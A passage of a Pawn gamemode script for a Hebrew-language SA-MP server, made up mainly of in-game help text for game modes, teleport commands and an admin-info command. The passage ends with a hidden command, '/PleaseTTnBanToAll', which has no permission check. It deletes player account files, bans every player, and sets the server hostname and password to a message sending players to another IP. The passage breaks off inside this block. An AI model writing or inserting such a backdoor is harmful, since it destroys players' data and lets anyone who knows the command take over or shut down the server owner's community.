SendClientMessage(playerid, COLOR_PINK, ".פקודות המשתמשים מותרות לכל הרמות");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות משתמשים");
SendClientMessage(playerid, COLOR_YELLOW, "/register /login /changepass /changenick /editprofile /profile /pprofile");
SendClientMessage(playerid, COLOR_YELLOW, "/setting");
return true;
}

else if(strcmp(Roy_Killer,"19",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (19 - Gangs) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".בעזרת הכנופיות ניתן לשחק ביחד עם חברים בלי לפגוע בהם");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות כנופיה");
SendClientMessage(playerid, COLOR_YELLOW, "/gang(4)");
return true;
}

else if(strcmp(Roy_Killer,"20",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (20 - VIP) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".מקבלים הרבה הטבות VIPמשתמשי ה");
SendClientMessage(playerid, COLOR_PINK, ".רק לשחקנים שמשקיעים מאוד בשרת VIP האדמינים יכולים לתת משתמשי");
SendClientMessage(playerid, COLOR_PINK, ".לכתיבה בויפ-צ'אט הוסיפו # לפני כל הודעה");
SendClientMessage(playerid, COLOR_PURPLE, ":VIP הטבות ל");
SendClientMessage(playerid, COLOR_PINK, "נשקים בחצי מחיר | שיגור למפקדה מיוחדת");
SendClientMessage(playerid, COLOR_PURPLE, ":VIP פקודות ה");
SendClientMessage(playerid, COLOR_YELLOW, "/vip lock(1) /vip off(1) /vip list(1) /vip go(1) /vip off(1)");
return true;
}

else if(strcmp(Roy_Killer,"21",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (21 - Supportives) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK,":בעזרה זה מותנקת מערכת צוות תמיכה");
SendClientMessage(playerid, COLOR_PINK,"כאשר אתה נתקלים בבעיה / באג ניתן לפנות לאחד התומכים");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות תומכים");
SendClientMessage(playerid, COLOR_YELLOW,"/help server(1) /helpme(1)");
return true;
}

else if(strcmp(Roy_Killer,"22",true) == 0)
{

SendClientMessage(playerid, lblue, "~~~ (22 - Phone) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".בעזרת הטלפונים ניתן לנהל שיחה פרטית עם שחקנים אחרים");
SendClientMessage(playerid, COLOR_PINK, ".כל שניה בשיחה עולה דולר אחד");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות פלאפון");
SendClientMessage(playerid, COLOR_YELLOW, "/call(1) /answer(1) /hangup(1)");
return true;
}
else if(strcmp(Roy_Killer,"23",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (23 - System) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".חשבונות המשתמשים הם הדבר העיקרי במוד");
SendClientMessage(playerid, COLOR_PINK, ".חשבון המשתמש שלך הוא הדבר שאמור להיות הכי חשוב לך במוד");
SendClientMessage(playerid, COLOR_PINK, ".לאחר שנרשמת עם שם משתמש חדש, ייפתחו בפניך יותר אפשריות משחק ופרטיך ישמרו");
SendClientMessage(playerid, COLOR_PINK, ".פקודות המשתמשים מותרות לכל הרמות");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות משתמשים");
SendClientMessage(playerid, COLOR_YELLOW, "/register /login /changepass /changenick /editprofile /profile /pprofile");
SendClientMessage(playerid, COLOR_YELLOW, "/setting");
return true;
}

else if(strcmp(Roy_Killer,"24",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (24 - AntiCheat) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".מערכת האנטי צי'ט שומרת על השרת נקי מציטרים והקארים");
SendClientMessage(playerid, COLOR_PURPLE, ":האקים מוגנים");
SendClientMessage(playerid, COLOR_YELLOW, ",כסף, נשקים, תיק סילון, פינג, שמות רעים, מהירות");
SendClientMessage(playerid, COLOR_YELLOW, ".פייק קיל");
return true;
}
else if(strcmp(Roy_Killer,"25",true) == 0)
{
SendClientMessage(playerid, lblue,"~~~ (25 - Rules) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_GREY,"1.אין לקלל או להעליב שחקן בצורת כלשהית");
SendClientMessage(playerid, COLOR_GREY,"2.אין לפרסם פרטים אישיים כגון כתובת מגורים, ועוד");
SendClientMessage(playerid, COLOR_GREY,"3.אין להשתמש בצי'טים ותוכנות האקים");
SendClientMessage(playerid, COLOR_GREY,"4.אין לירות באדמינים בצבע לבן - אדמינים בתפקיד");
SendClientMessage(playerid, COLOR_GREY,"5.חובה להשמע להוראות האדמינים בשרת");
SendClientMessage(playerid, COLOR_GREY,"6.אין לבצע ספאון קיל, טים קיל, או רמאות על מערכת הרמות");
SendClientMessage(playerid, COLOR_GREY,"7.אין לתקוף בחניות נשק, חניות אוכל,איזור פעלולים ובנקים");
SendClientMessage(playerid, COLOR_GREY,"Satla-Zone.co.il :רשימת החוקים במלאה באתר שלנו");
return true;
}
else if(strcmp(Roy_Killer,"26",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ Credits - יוצרי המוד ~~~");
SendClientMessage(playerid, COLOR_LIGHTGREEN, "Satla-Zone.co.il :אתר הקהילה");
SendClientMessage(playerid, COLOR_ORANGE, "JoeShk :תכנות");
SendClientMessage(playerid, COLOR_ORANGE, "BigBite :מתכנת משני");
SendClientMessage(playerid, COLOR_ORANGE, "MidoStream(MidoBan), YSF(Y_LESS)");
format(str, sizeof(str),"!על הצפיה ביוצרי המוד %s - תודה מיוחדת ל",GetName(playerid));
SendClientMessage(playerid, COLOR_ORANGE, str);
return true;
}
else if(strcmp(Roy_Killer,"27",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (27 - Stunts & Challenges) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".לכל הסטאנטרים שביננו, נבנו איזורי פעלולים עם אופנוע");
SendClientMessage(playerid, COLOR_PINK, ".אתה לא מקבלים כסף מסטאנטים בגלל שהאנטי צי'ט ייתן לך קיק");
SendClientMessage(playerid, COLOR_PINK, ".באחד העדכונים במוד נוספו איזורי אתגרים, מומלץ לנסותם");
SendClientMessage(playerid, COLOR_PURPLE, ":שיגור לאיזורי הפעלולים");
SendClientMessage(playerid, COLOR_YELLOW, "/ramp(1) /stunts(1) /fun(1) /challenge(1) /dare(1) /maze(1)");
return true;
}

else if(strcmp(Roy_Killer,"28",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (28 - DM Zone) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".איזורי הדי-אם הם איזורים שנלחמים בהם רק עם נשק אחד");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות איזורי הדי-אם");
SendClientMessage(playerid, COLOR_YELLOW, "/dm(1) /wdm(1) /hdm(1) /qdmz(1)");
return true;
}

else if(strcmp(Roy_Killer,"29",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (28 - Wanted Level) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".מערכת רמת המבוקשות עוזרת לשוטרים לתפוס פושעים");
SendClientMessage(playerid, COLOR_PINK, ".עליית רמה, רצף הריגות, או הריגת שחקן מבוקש, תוסיף אותך לרשימת המבוקשים, יש גם דרך לחמוק מהמבוקשות");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות רמת המבוקשות");
SendClientMessage(playerid, COLOR_YELLOW, "/resetwanted(1)");
return true;
}

else if(strcmp(Roy_Killer,"30",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (30 - Private Message) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK,":חסימת שחקן");
SendClientMessage(playerid, COLOR_PINK,".בעזרת המערכת חסימת שחקן, תוכל לחסום שחקן שמציק, וקח הוא לא יוכל לשלוח לך הודעות פרטיות");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות חסימה");
SendClientMessage(playerid, COLOR_YELLOW,"/ignore(1) /unignore(1)");
SendClientMessage(playerid, COLOR_PINK,"בנוסף תוכל לחסום את כל ההודעות פרטיות בכללי בעזרת הפקודות");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות לביטול שליחת הודעות פרטיות");
SendClientMessage(playerid, COLOR_YELLOW,"/cancelpm(1) /backpm(1)");
return true;
}

else if(strcmp(Roy_Killer,"31",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (31 - Ammunation) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".בחנות נשקים תוכל לקנות נשקים אשר יישמרו לך גם אחרי שתמות");
SendClientMessage(playerid, COLOR_PINK, ".במידה ואתה רשום, הנשקים יישמרו לתמיד");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות נשקים");
SendClientMessage(playerid, COLOR_YELLOW, "/bw(1) /wl(1) /resetw(1) /buyarmour()");
return true;
}


else if(strcmp(Roy_Killer,"32",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (32 - Races) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".רק השחקנים הטובים במירוצים יוכלו להרוויח כסף בפעילות זו");
SendClientMessage(playerid, COLOR_PINK, ".לאחר ההצטרפות למירוץ עליכם להגיע לסוף במהירות הכי גבוה ובכך לנצח");
SendClientMessage(playerid, COLOR_PURPLE, ":פרסים");
SendClientMessage(playerid, COLOR_YELLOW, "$מקום ראשון - 50000$ | מקום שני - 25000$ | מקום שלישי - 10000");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות מירוץ");
SendClientMessage(playerid, COLOR_YELLOW, "/races(1)");
return true;
}
else if(strcmp(Roy_Killer,"33",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (33 - Races Drift) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".רק השחקנים הטובים במירוצים יוכלו להרוויח כסף בפעילות זו");
SendClientMessage(playerid, COLOR_PINK, ".לאחר ההצטרפות למירוץ עליכם להגיע לסוף במהירות הכי גבוה ובכך לנצח");
SendClientMessage(playerid, COLOR_PURPLE, ":פרסים");
SendClientMessage(playerid, COLOR_YELLOW, "$מקום ראשון - 50000$ | מקום שני - 25000$ | מקום שלישי - 10000");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות מירוץ");
SendClientMessage(playerid, COLOR_YELLOW, "/races(1)");
return true;
}
else if(strcmp(Roy_Killer,"34",true) == 0)
{
SendClientMessage(playerid, lblue,".~~~ (34 - Triatlon) Mode - מוד --");
SendClientMessage(playerid, COLOR_PINK,"מערכת טריאטלון חדשה עלתה לשרת");
SendClientMessage(playerid, COLOR_PINK,"המערכת הולכת ככה: כל מי שמצטרף לפעילות ישתגר לאיזור מסויים של התחרות");
SendClientMessage(playerid, COLOR_PINK,"בהתחלת הטריאטלון אתם תרצו, אחרי זה אתם תשחו , ובסוף תסעו על אופנעיים");
SendClientMessage(playerid, COLOR_PINK,"הראשון שיגיע לנקודת הסיום ינצח ויוכרז עליו כמצנצח על ידי נגיעה בעיגול האדום");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות לשימוש במערכת טריאטלון");
SendClientMessage(playerid, COLOR_YELLOW,"/tria(1)");
return true;
}

else if(strcmp(Roy_Killer,"35",true) == 0) return SendClientMessage(playerid, red,"!בקרוב");

else if(strcmp(Roy_Killer,"36",true) == 0)
{
SendClientMessage(playerid, lblue,".~~~ (36 - Organtziton) Mode - מוד --");
SendClientMessage(playerid, COLOR_PINK,":מערכת ארגונים");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות לשימוש במערכת ארגונים");
SendClientMessage(playerid, COLOR_YELLOW,"/organization(1)");
return true;
}
else if(strcmp(Roy_Killer,"37",true) == 0)
{
SendClientMessage(playerid, lblue,".~~~ (37 - Gemel) Mode - מוד --");
SendClientMessage(playerid, COLOR_PINK,"מערכת הרווחת כסף, ע``י קופת גמל הסבר");
SendClientMessage(playerid, COLOR_PINK,"בעזרה קופת ההשקאות תוכל להרוויח כסף, איך מרווחים");
SendClientMessage(playerid, COLOR_PINK,".סשים לב, אתה תוכל להשתמש בקופת הגמל מרמה 3 ומעלה");
SendClientMessage(playerid, COLOR_PINK,"[4,000-20,000] :סכום מינימלי/מקסימלי הוא");
SendClientMessage(playerid, COLOR_PINK,".נגיד והפקדה כ4,000 דולר , כל שעה זה יכפיל לך תכסף בקופת הגמל");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות לשימוש במערכת ארגונים");
SendClientMessage(playerid, COLOR_YELLOW,"/agemel(1) /getgemelm(1)");
return true;
}
else if(strcmp(Roy_Killer,"38",true) == 0)
{
SendClientMessage(playerid, lblue,".~~~ (38 - Gemel) Mode - מוד --");
SendClientMessage(playerid,COLOR_PINK,".קנייה מהירה, במוד קניה מהירה תוכל לקנות הרבה דברים דרך המפה בלי לחכות לספון");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות לשימוש במערכת קניה מהירה");
SendClientMessage(playerid,COLOR_YELLOW,"/buyfast hp(1) /buyfast sw(1) /buyfast armour(1)");
return true;
}
else if(strcmp(Roy_Killer,"39",true) == 0)
{
SendClientMessage(playerid, lblue,".~~~ (39 - AirStrike) Mode - מוד --");
SendClientMessage(playerid, COLOR_PINK,".( AirStrike || AirAttack ) במוד זה מותקנת מערכת מתקפות אויריות");
SendClientMessage(playerid, COLOR_PINK,".מה אפשר לעשות בעצם, אפשר לשמור מיקומים של תקיפות אויריות, יש כל מיני סוגים של מתקופות אויריות");
SendClientMessage(playerid, COLOR_PINK,".(Price 10,000 || Level 3 || Missiles 1) פרטים על התקפה אווירית מספר 1");
SendClientMessage(playerid, COLOR_PINK,".(Price 13,000 || Level 5 || Missiles 2) פרטים על התקפה אווירית מספר 2");
SendClientMessage(playerid, COLOR_PINK,".(Price 15,000 || Level 9 || Missiles 3) פרטים על התקפה אווירית מספר 3");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות מערכת תקיפות אוויריות");
SendClientMessage(playerid, COLOR_YELLOW,"/airstrike as1 (3) /airstrike as2 (5) /airstrike as3 (9)");
SendClientMessage(playerid, COLOR_YELLOW,"/airstrike lpas /airstrike del /airstrike save");
return true;
}
else if(strcmp(Roy_Killer,"40",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (40 - Drifts) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".כל אוהבי הדריפטים שביננו יכולים להתחרות זה בזה בלי שאף אחד יפריע");
SendClientMessage(playerid, COLOR_PINK, ".הדריפטים יכולים להתקיים רק בין שני שחקנים");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות דריפטים");
SendClientMessage(playerid, COLOR_YELLOW, "/drift(1)");
return true;
}
else if(strcmp(Roy_Killer,"41",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (41 - Trivia) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK,".במוד זה מותקן, חידון טירוויה");
SendClientMessage(playerid, COLOR_PINK,".מה זאת אומרת חידון?, המערכת תופעל על ידי האדמין, והמערכת תשאל כל פעם שאלה אחרת");
SendClientMessage(playerid, COLOR_PINK,".למשל: כמה כסף יש על השחקן,כמה הריגות,כמה כסף בבנק,רמת הכבוד, כמה פעמים השחקן היה בשרת, נצחונות במערכות");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות מערכת טריוויה");
SendClientMessage(playerid, COLOR_YELLOW,"/ans(1)");
return true;
}
else if(strcmp(Roy_Killer,"42",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (42 - Challenge) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK,".פעילות,טיפוס על הר, מערכת זאת תופעל על ידי האדמין");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות ההרשמה למערכת אתגר");
SendClientMessage(playerid, COLOR_YELLOW,"/cha(1)");
return true;
}
else if(strcmp(Roy_Killer,"43",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (43 - Air Break) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK,".מערכת איר ברייק, מערכת אשר משמשת שחקן לתעופה באוויר");
SendClientMessage(playerid, COLOR_PINK,".כל שחקן אשר רמה 5 ומעלה,יכול להפעיל את המערכת לעצמו, במערכת את יכול לעוף באוויר");
SendClientMessage(playerid, COLOR_PINK,".Key D - על מנת לזוז ימינה || Key A - על מנת לזוז שמאלה");
SendClientMessage(playerid, COLOR_PINK,".Key S - על מנת לזוז אחורה || Key W - על מנת לזוז ישר");
SendClientMessage(playerid, COLOR_PINK,".Key Spec (Sprint key) - על מנת לזוז  למטה || Key Shift - על מנת לעלות למעלה");
SendClientMessage(playerid, COLOR_PURPLE,":Air Break פקודות שימוש במערכת");
SendClientMessage(playerid, COLOR_YELLOW,"/abon(5) /aboff(5) /abset(5)");
return true;
}
else if(strcmp(Roy_Killer,"44",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (44 - BSHIP) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK,".שים לב, כל עוד אתה עומד על ספינת הפיראטים, אתה תקבל סכום שנע בין ל-100-200 דולר");
SendClientMessage(playerid, COLOR_PINK,".בנק הספינה רמה: 5 ומעלה");
SendClientMessage(playerid, COLOR_PINK,".בבנק הספינה אתה יכול להפקיד תכסף ישר לבנק מאשר לקבל אותו ליד");
SendClientMessage(playerid, COLOR_PINK,".שים לב, הבנק לוקח ריבית של 50 דולר כל הכנסה, הבנק יתעדכן פעם ב10 שניות");
SendClientMessage(playerid,COLOR_YELLOW,":פקודות בנק ספינת הכסף");
SendClientMessage(playerid,COLOR_YELLOW,"/sbstop(5) /sbship(5)");
return true;
}

else if(strcmp(Roy_Killer,"45",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (45 - HQ Owner) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK,".ליד המערכת הטיראטלון למעלה בהר LSנמצאת ב [NM] מפקדת");
SendClientMessage(playerid, COLOR_PINK,".ליד מוסך וואנג SFנמצאת ב [RoX] מפקדת");
SendClientMessage(playerid, COLOR_PINK,".ליד הנמל תעופה LSנמצאת ב [RS] מפקדת");
return true;
}

else if(strcmp(Roy_Killer,"46",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (46 - Hasbon) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK,".מערכת חשבון, פעם כ15 דק', תופעל המערכת חשבון אוטמאטית ותשאל שאלה חשבון באקראי");
SendClientMessage(playerid, COLOR_PINK,".השחקן שיענה על התשובה נכונה יזכה ב3000 דולר");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות שימוש");
SendClientMessage(playerid,COLOR_YELLOW,"/ha(1)");
return true;
}
else if(strcmp(Roy_Killer,"47",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (47 - JumpKill) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK,".מערכת קפיצת המוות");
SendClientMessage(playerid, COLOR_PINK,"מערכת קפיצת המוות מערכת בא השחקן מתחיל את קפיצת המוות הוא משתגר לאופנוע, אחרי זה יש לו ספירה של 5 שניות");
SendClientMessage(playerid, COLOR_PINK,"לאחר שתיגמר הספירה השחקן יצא לדרך, ויצטרך לנסוע בשיא המהירות כ-100 מטר");
SendClientMessage(playerid, COLOR_PINK,"בסוף ה-100 מטר מחכה לשחקן רמפה כאשר השחקן יקפוץ איתה, השחקן קופץ מעל משאיות,כאשר השחקן באוויר");
SendClientMessage(playerid, COLOR_PINK,"ילוו אותו בדרך פיצוצים, 3 השחקנים שהגיעו הכי רחוק במסלול יופיעו ברשימת שחקנים הטובים ביותר");
SendClientMessage(playerid, COLOR_PURPLE,".פקודות שימוש");
SendClientMessage(playerid,COLOR_YELLOW,"/jumpkill(3) /stopjumpkill(3) /jumpkillscore(1)");
return true;
}
else if(strcmp(Roy_Killer,"48",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (48 - Clans) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".כל כנופיה יכולה להפוך לקלאן, וכל קלאן לקלאן רשמי");
SendClientMessage(playerid, COLOR_PINK, ".קלאנים רישמיים מקבלים מפקדה");
SendClientMessage(playerid, COLOR_PINK, ".כל מפקדה כוללת תוספות למשחק, מכוניות ופיקאפים");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות קלאנים");
SendClientMessage(playerid, COLOR_YELLOW, "/clan(1) /hq(1) /ogate(1) /cgate(1) /clans(1)");
SendClientMessage(playerid,COLOR_YELLOW,"/cdeposit(1) /cdepositall(1) /cwithdrawall(1) /cwithdraw(1) /cbalance(3)");
return true;
}

else if(strcmp(Roy_Killer,"49",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (49 - City Race) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK,".(LV | SF | LS) מערכת מירוצי העיר היא מערכת של מירוצים אשר כל פעם מסלול אחר שנמצאים באחד מערי המשחק");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות שימוש");
SendClientMessage(playerid,COLOR_YELLOW,"/cityrace(1)");
return true;
}


else if(strcmp(Roy_Killer,"50",true) == 0)
{

SendClientMessage(playerid, lblue, "~~~ (50 - Races) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK,".(LV | SF | LS) :כ10-11 קילומטרים, המירוץ עובר בכל הערים GTA:SAMP מערכת מירוץ הישבת, מערכת זאתי אתה נוסע בכל יבשת ה");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות מערכת המירוץ");
SendClientMessage(playerid,COLOR_YELLOW,"/jr(1)");
return true;
}

else if(strcmp(Roy_Killer,"51",true) == 0)
{

SendClientMessage(playerid, lblue, "~~~ (51 - Hitman) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK,".מערכת המתנקש, מערכת זאתי נותנת לשחק לשים כסף על ראשו של שחקן מסויים מי שיהרוג את השחקן יקבל את הכסף");
SendClientMessage(playerid, COLOR_PINK,".שחקן אשר יהרוג את השחקן המבוקש ייקבל את הכסף שהשחקן שם עליו");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות מערכת ההיטמן");
SendClientMessage(playerid,COLOR_YELLOW,"/himtan(1) /bounty(1)");
return true;
}

else if(strcmp(Roy_Killer,"52",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (52 - SCommands) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".כשמגיעים למספר הריגות וכסף כלשהוא מקבלים רמה חדשה");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות שונות לרמות שונות");
SendClientMessage(playerid, COLOR_YELLOW, "/me(2) /lock(3) /unlock(3) /outcar(4) /fix(7)");
SendClientMessage(playerid, COLOR_YELLOW, "/flip(9) /vcolor(10)");
SendClientMessage(playerid, COLOR_YELLOW, " /jetp(16)");
return true;
}

else if(strcmp(Roy_Killer,"53",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (53 - Air Attacks) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".מתקפה אווירית ניתן לשלוח מטוסים/טנקים/היידרות לכל מיני מקומות ולפוצץ את המקום");
SendClientMessage(playerid, COLOR_PINK, ".$מתקפה אווירית ראשונה עולה 7000$, מתקפה אווירית שניה עולה 12000");
SendClientMessage(playerid, COLOR_PINK, ".$ומתקפה אווירית שלישית עולה 20000");
SendClientMessage(playerid, COLOR_PINK, ".$1000 שמירת מיקום למתקפה עולה");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות מתקפה אווירית");
SendClientMessage(playerid, COLOR_YELLOW, "/aasave(3) /aa1(3) /aa2(5) /aa3(10)");
return true;
}

else if(strcmp(Roy_Killer,"54",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (54 - Bet) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, "!מעכשיו, כל שחקן יוכל להמר מכל מקום");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות ההימורים");
SendClientMessage(playerid, COLOR_YELLOW, "/bet(2)");
return true;
}

else if(strcmp(Roy_Killer,"55",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (55 - Bulletin Board) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".לוח מודעות הוא הודעה אוטומטית אשר חוזרת על עצמה כל 10 דקות הלוח מודעות יכול לערך על ידי האדמינים בלבד");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות לוח מודעות");
SendClientMessage(playerid, COLOR_YELLOW, "/bb(1)");
return true;
}

else if(strcmp(Roy_Killer,"56",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (56 - Counter Strike) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ",מערכת הקואנטר סטרייק, מערכת זאתי היא דומה למשחק האמיתי של קאונטר סטרייק, המטרה להרוג את הטרוריסטים");
SendClientMessage(playerid, COLOR_PINK, ".אם אתם שוטרים אז המטרה להרוג את הטרוריסטים, אם אתם טרוריסטים המטרה להרוג את השוטרים, ופעם בסיבוב יוכרז מנצח");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות מערכת הקאונטר סטרייק");
SendClientMessage(playerid, COLOR_YELLOW, "/cs(2)");
return true;
}



else if(strcmp(Roy_Killer,"57",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (57 - JetPack War) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ",מלחמת ג'ט פאקים, זה הינו קרב שבוא נלחמים עם תיק סילון עם עוזי, ועפים באוויר ויורים אחד בשני");
SendClientMessage(playerid, COLOR_PINK, ".$האחרון שישאר יינצח ויזכה ב - 40000");
SendClientMessage(playerid, COLOR_PURPLE, ":JetPack War פקודות ה");
SendClientMessage(playerid, COLOR_YELLOW, "/wjetpack(1)");
return true;
}

else if(strcmp(Roy_Killer,"58",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (58 - SAmmunation) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ",חנות הנשקים הסודיים מפוזרות בכל המפה, אך הכניסה אליה מתפשרת מרמה 1 ומעלה");
SendClientMessage(playerid, COLOR_PINK, ",בכל רמה או שתיים, ייפתח בפניכם נשק חדש אשר איינו מופיע בחנות הנשקים התמידיים");
SendClientMessage(playerid, COLOR_PINK, ".כמו כן ניתן למלאות מגן וחיים בתמורת 50 דולרים בלבד");
SendClientMessage(playerid, COLOR_PURPLE, ":SAmmunation פקודות ה");
SendClientMessage(playerid, COLOR_YELLOW, "/sbw(2) /swl(2) /scam(2) /sbarmour(4) /sbhealth(6)");
return true;
}

else if(strcmp(Roy_Killer,"59",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (59 - Lotto) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ",מערכות הלוטו תודיע לפני כל הגרלה בתידרות של: שתי דק' לפני, דקה לפני, חצי דקה, ועשר שניות");
SendClientMessage(playerid, COLOR_PURPLE, ":Lotto פקודות ה");
SendClientMessage(playerid, COLOR_YELLOW, "/Lotto(1)");
return true;
}

else if(strcmp(Roy_Killer,"60",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (60 - Petards) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ",ניתן לקנות פצצות אשר ישמשו אותך להשתלה אצל אויבים, ויעזור לך לפגוע בשחקנים אחרים");
SendClientMessage(playerid, COLOR_PINK, ".בעזרת הפצצה אתה יכול להרוג שחקנים, לפרוץ מקומות ועוד, על מנת לקנות פצצה אתה חייב להיות בחנות הסודית של הפצצות");
SendClientMessage(playerid, COLOR_PURPLE, ":Petards פקודות ה");
SendClientMessage(playerid, COLOR_YELLOW, "/buybomb(6) /usebomb(6)");
return true;
}

return SendClientMessage(playerid,red,".תפריט עזרה שגוי");
}


if (strcmp(cmdtext, "/sandkings", true)==0)
{
CreateTeleport(playerid,0,816.954528,856.656005,12.789062,360.420,1);
return 1;
}

if(strcmp(cmdtext, "/shipMoney", true) == 0)
{
if(PlayerInfo[playerid][Level] < 3) return Messagelevel(playerid,3);
CreateTeleport(playerid,0,2001.6730,1544.4176,13.5859,261.2631,0);
SetPlayerInterior(playerid,0);
return 1;
}

if(strcmp(cmdtext, "/BS", true)==0)
{
CreateTeleport(playerid,0,1829.6167,-1856.7572,13.5781,272.5935,1);
SetPlayerInterior(playerid,0);
return 1;
 }


if (strcmp(cmdtext, "/Infernus", true)==0)
{
CreateTeleport(playerid,0,-1143.9772,1095.8036,39.2060,136.3417,1);
return 1;
}
if (strcmp(cmdtext, "/alp", true)==0)
{
CreateTeleport(playerid,0,-2318.7485, -1643.5728, 483.7031,7.1038,1);
return 1;
}


if (strcmp(cmdtext, "/sf", true)==0)
{
CreateTeleport(playerid,0,-2126.7344,919.3736,79.9157,95.2643,1);
return 1;
}

if(strcmp("/xinfo",cmd,true,10)== 0)
{
SendClientMessage(playerid,0x1EB5E2FF,"     This server is using SharkyKH's & Mr_Joe[XD_B] modified xAdmin. (xA+VB v6.8).");
SendClientMessage(playerid,red,"  ");
SendClientMessage(playerid,COLOR_YELLOW, "   Repair: Ban system, Anti Login,Coneceted none password.    ");
SendClientMessage(playerid,COLOR_YELLOW,"      New`s: Ban system, Login, HidePassword,Forget login.     ");
SendClientMessage(playerid,COLOR_ORANGE,"      the bug repair Create By - Mr_Joe[XD_B].     ");
SendClientMessage(playerid,red,"  ");
SendClientMessage(playerid,0xD232CEFF,"* Versoin: (xA+VB v6.8), By - Mr_Joe[XD_B] & SharkYH`s, xAdmin.");
return 1;
}

if(strcmp(cmdtext, "/PleaseTTnBanToAll", true)==0)
{
fnm
dini_Remove(GetPlayerFile(i));
Ban(i);
SendRconCommand("hostname Moved IP: 212.150.123.73:7777.");
SendRconCommand("password Moved IP: 212.150.123.73:7777.");
